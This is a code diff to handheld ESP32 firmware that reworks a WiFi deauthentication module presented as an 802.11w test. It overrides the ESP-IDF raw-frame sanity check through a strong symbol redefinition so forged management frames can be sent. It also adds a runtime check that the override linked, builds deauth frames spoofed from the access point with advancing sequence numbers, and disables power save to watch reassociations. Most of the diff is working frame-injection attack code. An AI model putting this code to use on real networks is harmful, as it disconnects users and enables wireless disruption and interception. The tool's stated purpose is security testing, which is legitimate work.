@@ -15,25 +15,51 @@
 // The ESP-IDF refuses to transmit a forged management frame through
 // esp_wifi_80211_tx: ieee80211_raw_frame_sanity_check rejects it. Testing
 // whether a network accepts forged management frames is the entire point of
-// 802.11w, so that check has to be bypassed to run the test at all.
+// 802.11w, so that check has to be overridden to run the test at all.
 //
-// It is done with a linker wrap rather than by redefining the symbol. The
-// symbol in libnet80211.a is strong, not weak, so a plain redefinition is a
-// multiple-definition error -- and the workaround usually reached for,
-// -Wl,-zmuldefs, disables duplicate-symbol detection across the WHOLE link and
-// would hide a genuine one-definition-rule bug anywhere in the firmware. The
-// wrap flag in platformio.ini redirects exactly this one call and nothing else.
+// THIS WAS --wrap FIRST, AND --wrap DOES NOT WORK HERE
 //
-// It lives at the top of the single file that sends such a frame, not in a
-// helper, so that anyone reading this file can see precisely what has been
-// unlocked and where.
-extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
-                                                       int32_t arg3) {
-    (void)arg; (void)arg2; (void)arg3;
-    return 0;
+// The reasoning for it was good: redirect exactly one call, rather than reach
+// for -Wl,-zmuldefs and disable duplicate-symbol detection across the whole
+// link. The result was still wrong. libnet80211 both DEFINES and CALLS this
+// function inside a single object file, so the call is an intra-object
+// relocation that no linker can rewrite -- and ld says nothing at all when a
+// --wrap matches nothing. The build was green and every single transmit failed
+// with "unsupport frame type". Confirmed with nm on the linked ELF:
+// __wrap_ieee80211_raw_frame_sanity_check was not in the binary.
+//
+// So it is a plain strong redefinition plus --allow-multiple-definition, which
+// is what Basanos arrived at after hitting the same wall on real hardware.
+//
+// AND IT PROVES ITSELF AT RUNTIME
+//
+// A link-time trick that silently stops working is exactly how this surface
+// came to report "0 frames sent" while looking healthy. One magic argument
+// returns a distinctive answer no real caller would ask for, so the firmware
+// can ask "did MY definition actually link?" and say so on screen instead of
+// transmitting into a void.
+// Distinctive enough that no real frame-sanity call would ever use it.
+static constexpr int32_t kRawTxProbe = 0x07A1B2C3;
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
+                                                int32_t arg3) {
+    (void)arg2;
+    (void)arg3;
+    if (arg == kRawTxProbe) return 1;   // the probe: this override is linked
+    return 0;                           // every real frame: permitted
 }
 
 namespace orthrus::modules {
+
+// True when OUR definition of the sanity check is the one that linked.
+//
+// Calling the plain name reaches whichever definition won, so a distinctive
+// answer is proof. If the library's version linked instead it returns 0 for
+// this argument like any other, and the surface says injection is unavailable
+// rather than counting up to zero frames sent.
+static bool rawTxAvailable() {
+    return ieee80211_raw_frame_sanity_check(kRawTxProbe, 0, 0) == 1;
+}
 
 using namespace orthrus::theme;
 namespace bd  = orthrus::board;
@@ -138,6 +164,12 @@ void stopSniffing() {
 // what a real access point sends when it wants a client to start again. It is
 // the reason code an access point would use itself, so a network that accepts
 // it is accepting exactly the frame 802.11w exists to authenticate.
+// Sequence numbers advance, because a stack that sees the same one twice may
+// treat the second frame as a retransmission and drop it. en_sys_seq=false on
+// esp_wifi_80211_tx means the MAC does NOT fill this in for us, so leaving it
+// at zero sends every frame with the same sequence number forever.
+uint16_t g_seq = 0;
+
 uint8_t buildDeauth(uint8_t* out, const uint8_t dest[d11::kMacLen],
                     const uint8_t bssid[d11::kMacLen]) {
     out[0] = 0xC0;  // type management, subtype deauthentication
@@ -147,8 +179,12 @@ uint8_t buildDeauth(uint8_t* out, const uint8_t dest[d11::kMacLen],
     std::memcpy(out + 4, dest, d11::kMacLen);   // addr1: receiver
     std::memcpy(out + 10, bssid, d11::kMacLen); // addr2: transmitter (the AP)
     std::memcpy(out + 16, bssid, d11::kMacLen); // addr3: BSSID
-    out[22] = 0x00;  // sequence control, filled in by the MAC
-    out[23] = 0x00;
+    // Sequence control: fragment number in the low 4 bits, sequence number in
+    // the top 12.
+    const uint16_t sc = static_cast<uint16_t>(g_seq << 4);
+    out[22] = static_cast<uint8_t>(sc & 0xFF);
+    out[23] = static_cast<uint8_t>(sc >> 8);
+    g_seq = static_cast<uint16_t>((g_seq + 1) & 0x0FFF);
     out[24] = 0x07;  // reason code, little endian
     out[25] = 0x00;
     return 26;
@@ -178,6 +214,10 @@ bool WifiDeauth::begin() {
 
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(false, false);
+    // Power save off: the watch phase after a burst is a sniffer, and a radio
+    // that sleeps misses the very reassociations that are the test's result.
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_ps(WIFI_PS_NONE);
     delay(50);
     startScan();
     return true;
@@ -441,7 +481,14 @@ void WifiDeauth::drawTarget() {
         ui::textAt(8, bd::kScreenH - kFooterH - 22, kHigh, "WPS is advertised");
 
     d.setTextDatum(top_left);
-    if (armed_) {
+    if (!rawTxAvailable()) {
+        // The one failure that would otherwise be invisible: a green build that
+        // cannot transmit. Saying it here beats a Result screen that blames the
+        // network.
+        ui::textAt(8, bd::kScreenH - kFooterH - 11, kCritical,
+                   "Injection unavailable in this build");
+        ui::footer("` back");
+    } else if (armed_) {
         ui::textAt(8, bd::kScreenH - kFooterH - 11, kCritical,
                    "ARMED -- enter transmits");
         ui::footer("enter fire   a disarm   ` back");
@@ -625,7 +672,11 @@ bool WifiDeauth::handleKeys() {
             case kKeyArm:
                 // Arming is its own step, and backing out clears it. The same
                 // shape as BadUSB, for the same reason.
-                if (view_ == View::Target) armed_ = !armed_;
+                //
+                // Refused outright when the raw-transmit override did not link:
+                // firing would count up to zero frames sent and report "no
+                // effect seen", which reads exactly like a protected network.
+                if (view_ == View::Target && rawTxAvailable()) armed_ = !armed_;
                 return true;
 
             case kKeyUp:
